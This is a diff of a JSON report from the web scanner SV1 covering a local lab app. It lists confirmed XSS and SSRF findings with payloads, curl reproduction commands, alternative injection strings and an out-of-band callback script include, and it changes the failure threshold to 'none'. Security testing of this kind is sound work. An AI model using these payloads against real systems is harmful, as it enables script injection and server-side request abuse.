@@ -1,7 +1,7 @@
 {
   "tool": "SV1",
   "author": "ee.zvz",
-  "version": "1.3.1",
+  "version": "1.3.2",
   "meta": {
     "target": "http://127.0.0.1:8099/",
     "crawl": true,
@@ -29,9 +29,9 @@
     "blind": true,
     "ssrf": true,
     "oob": "http://127.0.0.1:8777",
-    "fail_on": "high",
-    "scope": "scope-lab.txt",
-    "db": "A:\\ff\\sv1\\lab-1.3.1.db",
+    "fail_on": "none",
+    "scope": "A:\\ff\\sv1\\scope-lab.txt",
+    "db": "A:\\ff\\sv1\\lab-1.3.2.db",
     "sarif": "A:\\ff\\sv1\\docs\\evidence\\local-lab.sarif",
     "retest": false,
     "history_session": 1
@@ -45,7 +45,7 @@
     "unverified": 0,
     "fixed": 0,
     "retest": false,
-    "duration_seconds": 185.39
+    "duration_seconds": 185.99
   },
   "counts": {
     "total": 31,
@@ -251,18 +251,18 @@
       "url": "http://127.0.0.1:8099/fetch",
       "method": "GET",
       "param": "url",
-      "payload": "http://127.0.0.1:8777/t/751571ee3acb27f8",
+      "payload": "http://127.0.0.1:8777/t/c642ec899ad5fb4f",
       "confidence": "CONFIRMED",
-      "evidence": "target fetched http://127.0.0.1:8777/t/751571ee3acb27f8 at 15:37:26 from 127.0.0.1 (Python-urllib/3.14); response status 200",
+      "evidence": "target fetched http://127.0.0.1:8777/t/c642ec899ad5fb4f at 16:16:52 from 127.0.0.1 (Python-urllib/3.14); response status 200",
       "technique": "ssrf-oob",
       "detail": "url-like parameter made a server side request to the callback host",
       "artifact": "",
-      "curl": "curl -sS 'http://127.0.0.1:8099/fetch?url=http%3A%2F%2F127.0.0.1%3A8777%2Ft%2F751571ee3acb27f8'",
+      "curl": "curl -sS 'http://127.0.0.1:8099/fetch?url=http%3A%2F%2F127.0.0.1%3A8777%2Ft%2Fc642ec899ad5fb4f'",
       "data": {
         "oob": "fetched",
         "from": "127.0.0.1",
         "agent": "Python-urllib/3.14",
-        "time": "15:37:26"
+        "time": "16:16:52"
       }
     },
     {
@@ -271,20 +271,20 @@
       "url": "http://127.0.0.1:8099/api/fetch",
       "method": "GET",
       "param": "name",
-      "payload": "<svg/onload=alert('sv187a799c2')>sv187a799c2",
+      "payload": "<svg/onload=alert('sv15417429b')>sv15417429b",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv187a799c2",
+      "evidence": "executed in chromium: alert:sv15417429b",
       "technique": "reflected/text",
       "detail": "reflection confirmed; execution not yet proven (in HTML text flow) | proof: alert fired",
-      "artifact": "lab-artifacts-1.3.1/xss-08.png",
-      "curl": "curl -sS 'http://127.0.0.1:8099/api/fetch?id=1&name=%3Csvg%2Fonload%3Dalert%28%27sv187a799c2%27%29%3Esv187a799c2'",
+      "artifact": "A:\\ff\\sv1\\lab-artifacts-1.3.2/xss-08.png",
+      "curl": "curl -sS 'http://127.0.0.1:8099/api/fetch?id=1&name=%3Csvg%2Fonload%3Dalert%28%27sv15417429b%27%29%3Esv15417429b'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv187a799c2')>sv187a799c2",
-        "<script>alert('sv187a799c2')</script>sv187a799c2",
-        "sv187a799c2\"><svg/onload=alert('sv187a799c2')>",
-        "sv187a799c2'><svg/onload=alert('sv187a799c2')>",
-        "sv187a799c2</title><svg/onload=alert('sv187a799c2')>"
+        "<img src=x onerror=alert('sv15417429b')>sv15417429b",
+        "<script>alert('sv15417429b')</script>sv15417429b",
+        "sv15417429b\"><svg/onload=alert('sv15417429b')>",
+        "sv15417429b'><svg/onload=alert('sv15417429b')>",
+        "sv15417429b</title><svg/onload=alert('sv15417429b')>"
       ]
     },
     {
@@ -293,20 +293,20 @@
       "url": "http://127.0.0.1:8099/api/fetch",
       "method": "GET",
       "param": "name",
-      "payload": "<svg/onload=alert('sv14e0dd4c5')>sv14e0dd4c5",
+      "payload": "<svg/onload=alert('sv12bf5dd5c')>sv12bf5dd5c",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv14e0dd4c5",
+      "evidence": "executed in chromium: alert:sv12bf5dd5c",
       "technique": "reflected/text",
       "detail": "reflection confirmed; execution not yet proven (in HTML text flow) | proof: alert fired",
-      "artifact": "lab-artifacts-1.3.1/xss-12.png",
-      "curl": "curl -sS 'http://127.0.0.1:8099/api/fetch?id=1&name=%3Csvg%2Fonload%3Dalert%28%27sv14e0dd4c5%27%29%3Esv14e0dd4c5'",
+      "artifact": "A:\\ff\\sv1\\lab-artifacts-1.3.2/xss-12.png",
+      "curl": "curl -sS 'http://127.0.0.1:8099/api/fetch?id=1&name=%3Csvg%2Fonload%3Dalert%28%27sv12bf5dd5c%27%29%3Esv12bf5dd5c'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv14e0dd4c5')>sv14e0dd4c5",
-        "<script>alert('sv14e0dd4c5')</script>sv14e0dd4c5",
-        "sv14e0dd4c5\"><svg/onload=alert('sv14e0dd4c5')>",
-        "sv14e0dd4c5'><svg/onload=alert('sv14e0dd4c5')>",
-        "sv14e0dd4c5</title><svg/onload=alert('sv14e0dd4c5')>"
+        "<img src=x onerror=alert('sv12bf5dd5c')>sv12bf5dd5c",
+        "<script>alert('sv12bf5dd5c')</script>sv12bf5dd5c",
+        "sv12bf5dd5c\"><svg/onload=alert('sv12bf5dd5c')>",
+        "sv12bf5dd5c'><svg/onload=alert('sv12bf5dd5c')>",
+        "sv12bf5dd5c</title><svg/onload=alert('sv12bf5dd5c')>"
       ]
     },
     {
@@ -315,20 +315,20 @@
       "url": "http://127.0.0.1:8099/api/spa",
       "method": "GET",
       "param": "name",
-      "payload": "<svg/onload=alert('sv187955285')>sv187955285",
+      "payload": "<svg/onload=alert('sv14b024aa2')>sv14b024aa2",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv187955285",
+      "evidence": "executed in chromium: alert:sv14b024aa2",
       "technique": "reflected/text",
       "detail": "reflection confirmed; execution not yet proven (in HTML text flow) | proof: alert fired",
-      "artifact": "lab-artifacts-1.3.1/xss-09.png",
-      "curl": "curl -sS 'http://127.0.0.1:8099/api/spa?id=1&name=%3Csvg%2Fonload%3Dalert%28%27sv187955285%27%29%3Esv187955285'",
+      "artifact": "A:\\ff\\sv1\\lab-artifacts-1.3.2/xss-09.png",
+      "curl": "curl -sS 'http://127.0.0.1:8099/api/spa?id=1&name=%3Csvg%2Fonload%3Dalert%28%27sv14b024aa2%27%29%3Esv14b024aa2'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv187955285')>sv187955285",
-        "<script>alert('sv187955285')</script>sv187955285",
-        "sv187955285\"><svg/onload=alert('sv187955285')>",
-        "sv187955285'><svg/onload=alert('sv187955285')>",
-        "sv187955285</title><svg/onload=alert('sv187955285')>"
+        "<img src=x onerror=alert('sv14b024aa2')>sv14b024aa2",
+        "<script>alert('sv14b024aa2')</script>sv14b024aa2",
+        "sv14b024aa2\"><svg/onload=alert('sv14b024aa2')>",
+        "sv14b024aa2'><svg/onload=alert('sv14b024aa2')>",
+        "sv14b024aa2</title><svg/onload=alert('sv14b024aa2')>"
       ]
     },
     {
@@ -337,20 +337,20 @@
       "url": "http://127.0.0.1:8099/attr",
       "method": "GET",
       "param": "q",
-      "payload": "sv1e1e2395c'><svg/onload=alert(\"sv1e1e2395c\")>",
+      "payload": "sv191a80729'><svg/onload=alert(\"sv191a80729\")>",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1e1e2395c",
+      "evidence": "executed in chromium: alert:sv191a80729",
       "technique": "reflected/attr",
       "detail": "reflection confirmed; execution not yet proven (inside <input> attribute value (single quoted)) | proof: alert fired",
-      "artifact": "lab-artifacts-1.3.1/xss-06.png",
-      "curl": "curl -sS 'http://127.0.0.1:8099/attr?q=sv1e1e2395c%27%3E%3Csvg%2Fonload%3Dalert%28%22sv1e1e2395c%22%29%3E'",
+      "artifact": "A:\\ff\\sv1\\lab-artifacts-1.3.2/xss-06.png",
+      "curl": "curl -sS 'http://127.0.0.1:8099/attr?q=sv191a80729%27%3E%3Csvg%2Fonload%3Dalert%28%22sv191a80729%22%29%3E'",
       "data": {},
       "alternatives": [
-        "sv1e1e2395c'><script>alert(\"sv1e1e2395c\")</script>",
-        "sv1e1e2395c'></input><script>alert(\"sv1e1e2395c\")</script>",
-        "sv1e1e2395c'><img src=x onerror=alert(\"sv1e1e2395c\")>",
-        "sv1e1e2395c' autofocus onfocus='alert(\"sv1e1e2395c\")'",
-        "sv1e1e2395c' onmouseover='alert(\"sv1e1e2395c\")'"
+        "sv191a80729'><script>alert(\"sv191a80729\")</script>",
+        "sv191a80729'></input><script>alert(\"sv191a80729\")</script>",
+        "sv191a80729'><img src=x onerror=alert(\"sv191a80729\")>",
+        "sv191a80729' autofocus onfocus='alert(\"sv191a80729\")'",
+        "sv191a80729' onmouseover='alert(\"sv191a80729\")'"
       ]
     },
     {
@@ -359,19 +359,19 @@
       "url": "http://127.0.0.1:8099/blind-admin",
       "method": "GET",
       "param": "message",
-      "payload": "<script src=\"http://127.0.0.1:8777/t/2ae21befbb4f844e\"></script>",
+      "payload": "<script src=\"http://127.0.0.1:8777/t/5c9c2aac83c285b3\"></script>",
       "confidence": "CONFIRMED",
-      "evidence": "callback executed on http://127.0.0.1:8099/blind-admin: /t fetched at 15:38:16, /e image at 15:38:16 from 127.0.0.1 (Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/156.0.8078.4 Safari/537.36)",
+      "evidence": "callback executed on http://127.0.0.1:8099/blind-admin: /t fetched at 16:17:42, /e image at 16:17:42 from 127.0.0.1 (Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/156.0.8078.4 Safari/537.36)",
       "technique": "blind-oob",
       "detail": "blind xss: payload stored through POST http://127.0.0.1:8099/blind; the callback fired when the page rendered it",
-      "artifact": "lab-artifacts-1.3.1/blind-01.png",
+      "artifact": "A:\\ff\\sv1\\lab-artifacts-1.3.2/blind-01.png",
       "curl": "",
       "data": {
         "oob": "executed",
         "from": "127.0.0.1",
         "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
-        "fetched": "15:38:16",
-        "time": "15:38:16"
+        "fetched": "16:17:42",
+        "time": "16:17:42"
       }
     },
     {
@@ -385,7 +385,7 @@
       "evidence": "location.hash -> innerHTML: alert:sv1dom07ae084ce",
       "technique": "dom",
       "detail": "client side sink: decodeURIComponent(location.hash.slice(1));if (raw) { document.getElementById('out').innerHTML = raw; }",
-      "artifact": "lab-artifacts-1.3.1/dom-01.png",
+      "artifact": "A:\\ff\\sv1\\lab-artifacts-1.3.2/dom-01.png",
       "curl": "",
       "data": {}
     },
@@ -395,20 +395,20 @@
       "url": "http://127.0.0.1:8099/dynamic",
       "method": "GET",
       "param": "name",
-      "payload": "<svg/onload=alert('sv14d63b1ab')>sv14d63b1ab",
+      "payload": "<svg/onload=alert('sv143bcb911')>sv143bcb911",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv14d63b1ab",
+      "evidence": "executed in chromium: alert:sv143bcb911",
       "technique": "reflected/text",
       "detail": "reflection confirmed; execution not yet proven (in HTML text flow) | proof: alert fired",
-      "artifact": "lab-artifacts-1.3.1/xss-11.png",
-      "curl": "curl -sS 'http://127.0.0.1:8099/dynamic?id=1&name=%3Csvg%2Fonload%3Dalert%28%27sv14d63b1ab%27%29%3Esv14d63b1ab'",
+      "artifact": "A:\\ff\\sv1\\lab-artifacts-1.3.2/xss-11.png",
+      "curl": "curl -sS 'http://127.0.0.1:8099/dynamic?id=1&name=%3Csvg%2Fonload%3Dalert%28%27sv143bcb911%27%29%3Esv143bcb911'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv14d63b1ab')>sv14d63b1ab",
-        "<script>alert('sv14d63b1ab')</script>sv14d63b1ab",
-        "sv14d63b1ab\"><svg/onload=alert('sv14d63b1ab')>",
-        "sv14d63b1ab'><svg/onload=alert('sv14d63b1ab')>",
-        "sv14d63b1ab</title><svg/onload=alert('sv14d63b1ab')>"
+        "<img src=x onerror=alert('sv143bcb911')>sv143bcb911",
+        "<script>alert('sv143bcb911')</script>sv143bcb911",
+        "sv143bcb911\"><svg/onload=alert('sv143bcb911')>",
+        "sv143bcb911'><svg/onload=alert('sv143bcb911')>",
+        "sv143bcb911</title><svg/onload=alert('sv143bcb911')>"
       ]
     },
     {
@@ -422,7 +422,7 @@
       "evidence": "location.hash -> innerHTML: alert:sv1dom086fa534e",
       "technique": "dom",
       "detail": "client side sink: decodeURIComponent(location.hash.slice(1));if (raw) { document.getElementById('out').innerHTML = raw; } | script: http://127.0.0.1:8099/external.js",
-      "artifact": "lab-artifacts-1.3.1/dom-02.png",
+      "artifact": "A:\\ff\\sv1\\lab-artifacts-1.3.2/dom-02.png",
       "curl": "",
       "data": {}
     },
@@ -432,20 +432,20 @@
       "url": "http://127.0.0.1:8099/feedback",
       "method": "POST",
       "param": "message",
-      "payload": "<svg/onload=alert('sv1190274a7')>sv1190274a7",
+      "payload": "<svg/onload=alert('sv164bd6ed7')>sv164bd6ed7",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1190274a7",
+      "evidence": "executed in chromium: alert:sv164bd6ed7",
       "technique": "reflected/text",
       "detail": "reflection confirmed; execution not yet proven (in HTML text flow) | proof: alert fired",
-      "artifact": "lab-artifacts-1.3.1/xss-03.png",
-      "curl": "curl -sS -X POST --data-urlencode name= --data-urlencode 'message=<svg/onload=alert('\"'\"'sv1190274a7'\"'\"')>sv1190274a7' http://127.0.0.1:8099/feedback",
+      "artifact": "A:\\ff\\sv1\\lab-artifacts-1.3.2/xss-03.png",
+      "curl": "curl -sS -X POST --data-urlencode name= --data-urlencode 'message=<svg/onload=alert('\"'\"'sv164bd6ed7'\"'\"')>sv164bd6ed7' http://127.0.0.1:8099/feedback",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv1190274a7')>sv1190274a7",
-        "<script>alert('sv1190274a7')</script>sv1190274a7",
-        "sv1190274a7\"><svg/onload=alert('sv1190274a7')>",
-        "sv1190274a7'><svg/onload=alert('sv1190274a7')>",
-        "sv1190274a7</title><svg/onload=alert('sv1190274a7')>"
+        "<img src=x onerror=alert('sv164bd6ed7')>sv164bd6ed7",
+        "<script>alert('sv164bd6ed7')</script>sv164bd6ed7",
+        "sv164bd6ed7\"><svg/onload=alert('sv164bd6ed7')>",
+        "sv164bd6ed7'><svg/onload=alert('sv164bd6ed7')>",
+        "sv164bd6ed7</title><svg/onload=alert('sv164bd6ed7')>"
       ]
     },
     {
@@ -454,20 +454,20 @@
       "url": "http://127.0.0.1:8099/feedback",
       "method": "POST",
       "param": "name",
-      "payload": "<svg/onload=alert('sv13146ef11')>sv13146ef11",
+      "payload": "<svg/onload=alert('sv136d3cb22')>sv136d3cb22",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv13146ef11",
+      "evidence": "executed in chromium: alert:sv136d3cb22",
       "technique": "reflected/text",
       "detail": "reflection confirmed; execution not yet proven (in HTML text flow) | proof: alert fired",
-      "artifact": "lab-artifacts-1.3.1/xss-02.png",
-      "curl": "curl -sS -X POST --data-urlencode 'name=<svg/onload=alert('\"'\"'sv13146ef11'\"'\"')>sv13146ef11' --data-urlencode message= http://127.0.0.1:8099/feedback",
+      "artifact": "A:\\ff\\sv1\\lab-artifacts-1.3.2/xss-02.png",
+      "curl": "curl -sS -X POST --data-urlencode 'name=<svg/onload=alert('\"'\"'sv136d3cb22'\"'\"')>sv136d3cb22' --data-urlencode message= http://127.0.0.1:8099/feedback",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv13146ef11')>sv13146ef11",
-        "<script>alert('sv13146ef11')</script>sv13146ef11",
-        "sv13146ef11\"><svg/onload=alert('sv13146ef11')>",
-        "sv13146ef11'><svg/onload=alert('sv13146ef11')>",
-        "sv13146ef11</title><svg/onload=alert('sv13146ef11')>"
+        "<img src=x onerror=alert('sv136d3cb22')>sv136d3cb22",
+        "<script>alert('sv136d3cb22')</script>sv136d3cb22",
+        "sv136d3cb22\"><svg/onload=alert('sv136d3cb22')>",
+        "sv136d3cb22'><svg/onload=alert('sv136d3cb22')>",
+        "sv136d3cb22</title><svg/onload=alert('sv136d3cb22')>"
       ]
     },
     {
@@ -481,7 +481,7 @@
       "evidence": "stored through POST http://127.0.0.1:8099/guestbook and executed on http://127.0.0.1:8099/guestbook: alert:sv1stored11",
       "technique": "stored",
       "detail": "the payload was persisted by the application and ran on another page",
-      "artifact": "lab-artifacts-1.3.1/stored-02.png",
+      "artifact": "A:\\ff\\sv1\\lab-artifacts-1.3.2/stored-02.png",
       "curl": "",
       "data": {}
     },
@@ -496,7 +496,7 @@
       "evidence": "stored through POST http://127.0.0.1:8099/guestbook and executed on http://127.0.0.1:8099/guestbook: alert:sv1stored10",
       "technique": "stored",
       "detail": "the payload was persisted by the application and ran on another page",
-      "artifact": "lab-artifacts-1.3.1/stored-01.png",
+      "artifact": "A:\\ff\\sv1\\lab-artifacts-1.3.2/stored-01.png",
       "curl": "",
       "data": {}
     },
@@ -506,20 +506,20 @@
       "url": "http://127.0.0.1:8099/js",
       "method": "GET",
       "param": "q",
-      "payload": "0\";alert('sv15ed31ce5')//",
+      "payload": "0\";alert('sv1e4607019')//",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv15ed31ce5",
+      "evidence": "executed in chromium: alert:sv1e4607019",
       "technique": "reflected/script",
       "detail": "reflection confirmed; execution not yet proven (inside a <script> block (double)) | proof: alert fired",
-      "artifact": "lab-artifacts-1.3.1/xss-05.png",
-      "curl": "curl -sS 'http://127.0.0.1:8099/js?q=0%22%3Balert%28%27sv15ed31ce5%27%29%2F%2F'",
+      "artifact": "A:\\ff\\sv1\\lab-artifacts-1.3.2/xss-05.png",
+      "curl": "curl -sS 'http://127.0.0.1:8099/js?q=0%22%3Balert%28%27sv1e4607019%27%29%2F%2F'",
       "data": {},
       "alternatives": [
-        "0\");alert('sv15ed31ce5')//",
-        "0\"];alert('sv15ed31ce5')//",
-        "sv15ed31ce5</script><svg/onload=alert('sv15ed31ce5')>",
-        "sv15ed31ce5\"><svg/onload=alert('sv15ed31ce5')>",
-        "sv15ed31ce5'><svg/onload=alert('sv15ed31ce5')>"
+        "0\");alert('sv1e4607019')//",
+        "0\"];alert('sv1e4607019')//",
+        "sv1e4607019</script><svg/onload=alert('sv1e4607019')>",
+        "sv1e4607019\"><svg/onload=alert('sv1e4607019')>",
+        "sv1e4607019'><svg/onload=alert('sv1e4607019')>"
       ]
     },
     {
@@ -528,20 +528,20 @@
       "url": "http://127.0.0.1:8099/search",
       "method": "GET",
       "param": "q",
-      "payload": "<svg/onload=alert('sv129805262')>sv129805262",
+      "payload": "<svg/onload=alert('sv10ccc0c28')>sv10ccc0c28",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv129805262",
+      "evidence": "executed in chromium: alert:sv10ccc0c28",
       "technique": "reflected/text",
       "detail": "reflection confirmed; execution not yet proven (in HTML text flow) | proof: alert fired",
-      "artifact": "lab-artifacts-1.3.1/xss-01.png",
-      "curl": "curl -sS 'http://127.0.0.1:8099/search?q=%3Csvg%2Fonload%3Dalert%28%27sv129805262%27%29%3Esv129805262'",
+      "artifact": "A:\\ff\\sv1\\lab-artifacts-1.3.2/xss-01.png",
+      "curl": "curl -sS 'http://127.0.0.1:8099/search?q=%3Csvg%2Fonload%3Dalert%28%27sv10ccc0c28%27%29%3Esv10ccc0c28'",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv129805262')>sv129805262",
-        "<script>alert('sv129805262')</script>sv129805262",
-        "sv129805262\"><svg/onload=alert('sv129805262')>",
-        "sv129805262'><svg/onload=alert('sv129805262')>",
-        "sv129805262</title><svg/onload=alert('sv129805262')>"
+        "<img src=x onerror=alert('sv10ccc0c28')>sv10ccc0c28",
+        "<script>alert('sv10ccc0c28')</script>sv10ccc0c28",
+        "sv10ccc0c28\"><svg/onload=alert('sv10ccc0c28')>",
+        "sv10ccc0c28'><svg/onload=alert('sv10ccc0c28')>",
+        "sv10ccc0c28</title><svg/onload=alert('sv10ccc0c28')>"
       ]
     },
     {
@@ -550,20 +550,20 @@
       "url": "http://127.0.0.1:8099/waf",
       "method": "GET",
       "param": "q",
-      "payload": "<svg/onload=alert('sv1170ce03e')>sv1170ce03e",
+      "payload": "<svg/onload=alert('sv1dffac9ee')>sv1dffac9ee",
       "confidence": "CONFIRMED",
-      "evidence": "executed in chromium: alert:sv1170ce03e",
+      "evidence": "executed in chromium: alert:sv1dffac9ee",
       "technique": "reflected/text",
       "detail": "reflection confirmed; execution not yet proven (in HTML text flow) | proof: alert fired",
-      "artifact": "lab-artifacts-1.3.1/xss-07.png",
-      "curl": "curl -sS 'http://127.0.0.1:8099/waf?q=%3Csvg%2Fonload%3Dalert%28%27sv1170ce03e%27%29%3Esv1170ce03e'",
+      "artifact": "A:\\ff\\sv1\\lab-artifacts-1.3.2/xss-07.png",
+      "curl": "curl -sS 'http://127.0.0.1:8099/waf?q=%3Csvg%2Fonload%3Dalert%28%27sv1dffac9ee%27%29%3Esv1dffac9ee'",
       "data": {},
       "alternatives": [
-        "<script>alert('sv1170ce03e')</script>sv1170ce03e",
-        "sv1170ce03e\"><svg/onload=alert('sv1170ce03e')>",
-        "sv1170ce03e'><svg/onload=alert('sv1170ce03e')>",
-        "sv1170ce03e</title><svg/onload=alert('sv1170ce03e')>",
-        "sv1170ce03e</script><svg/onload=alert('sv1170ce03e')>"
+        "<script>alert('sv1dffac9ee')</script>sv1dffac9ee",
+        "sv1dffac9ee\"><svg/onload=alert('sv1dffac9ee')>",
+        "sv1dffac9ee'><svg/onload=alert('sv1dffac9ee')>",
+        "sv1dffac9ee</title><svg/onload=alert('sv1dffac9ee')>",
+        "sv1dffac9ee</script><svg/onload=alert('sv1dffac9ee')>"
       ]
     },
     {
@@ -587,20 +587,20 @@
       "url": "http://127.0.0.1:8099/api/xhr",
       "method": "POST",
       "param": "user.name",
-      "payload": "<svg/onload=alert('sv1cb2517be')>sv1cb2517be",
+      "payload": "<svg/onload=alert('sv160461cb1')>sv160461cb1",
       "confidence": "MEDIUM",
-      "evidence": "<html><body><h1>api body</h1><div><svg/onload=alert('sv1cb2517be')>sv1cb2517be</div></body></html>",
+      "evidence": "<html><body><h1>api body</h1><div><svg/onload=alert('sv160461cb1')>sv160461cb1</div></body></html>",
       "technique": "reflected/text",
       "detail": "reflection confirmed; execution not yet proven (in HTML text flow) | browser proof unavailable for json inputs",
       "artifact": "",
-      "curl": "curl -sS -X POST -H 'Content-Type: application/json' --data-raw '{\"user\":{\"name\":\"<svg/onload=alert('\"'\"'sv1cb2517be'\"'\"')>sv1cb2517be\"},\"q\":\"hello\"}' http://127.0.0.1:8099/api/xhr",
+      "curl": "curl -sS -X POST -H 'Content-Type: application/json' --data-raw '{\"user\":{\"name\":\"<svg/onload=alert('\"'\"'sv160461cb1'\"'\"')>sv160461cb1\"},\"q\":\"hello\"}' http://127.0.0.1:8099/api/xhr",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv1cb2517be')>sv1cb2517be",
-        "<script>alert('sv1cb2517be')</script>sv1cb2517be",
-        "sv1cb2517be\"><svg/onload=alert('sv1cb2517be')>",
-        "sv1cb2517be'><svg/onload=alert('sv1cb2517be')>",
-        "sv1cb2517be</title><svg/onload=alert('sv1cb2517be')>"
+        "<img src=x onerror=alert('sv160461cb1')>sv160461cb1",
+        "<script>alert('sv160461cb1')</script>sv160461cb1",
+        "sv160461cb1\"><svg/onload=alert('sv160461cb1')>",
+        "sv160461cb1'><svg/onload=alert('sv160461cb1')>",
+        "sv160461cb1</title><svg/onload=alert('sv160461cb1')>"
       ]
     },
     {
@@ -611,7 +611,7 @@
       "param": "q",
       "payload": "<svg/onload=alert(1)>",
       "confidence": "MEDIUM",
-      "evidence": "<html><body><h1>safe</h1><div>sv16452060b</div></body></html>",
+      "evidence": "<html><body><h1>safe</h1><div>sv16b8b3954</div></body></html>",
       "technique": "reflection-encoded",
       "detail": "input reaches the page (in HTML text flow) but markup was encoded or stripped (9 payloads reflected)",
       "artifact": "",
